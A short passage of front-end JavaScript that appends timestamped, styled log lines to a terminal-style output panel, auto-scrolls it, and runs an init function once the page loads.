    }
    
    if (text) {
        const line = `<div class="${color} ${glow} text-sm mb-1">[${timestamp}] ${text}</div>`;
        elements.output.innerHTML += line;
    } else {
        elements.output.innerHTML += '<div class="mb-2"></div>';
    }
    
    elements.output.scrollTop = elements.output.scrollHeight;
}

// Initialize on load
document.addEventListener('DOMContentLoaded', init);
